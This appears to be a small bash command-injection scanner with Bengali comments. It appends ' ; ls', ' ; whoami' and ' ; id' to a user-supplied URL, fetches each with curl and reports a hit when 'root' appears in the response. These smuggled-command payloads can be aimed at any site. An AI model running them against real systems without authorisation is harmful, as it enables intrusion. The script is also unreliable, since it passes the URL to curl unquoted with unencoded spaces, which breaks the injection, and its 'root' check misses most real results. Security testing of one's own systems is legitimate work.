#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for Command Injection Test (e.g., http://example.com/search?term=):"
read URL

# Command Injection পে-লোড
CMD_PAYLOADS=(" ; ls" " ; whoami" " ; id")

for payload in "${CMD_PAYLOADS[@]}"
do
    # প্রতিটি প্যারামিটার দিয়ে টেস্ট করা
    TEST_URL="${URL}${payload}"
    RESPONSE=$(curl -s $TEST_URL)

    # যদি সিস্টেম কমান্ডের আউটপুট পাওয়া যায়, কমান্ড ইনজেকশন ভ্যালনারেবিলিটি থাকতে পারে
    if echo $RESPONSE | grep -q "root"; then
        echo "[+] Potential Command Injection vulnerability detected with payload: $payload"
    else
        echo "[-] No Command Injection vulnerability detected with payload: $payload"
    fi
done
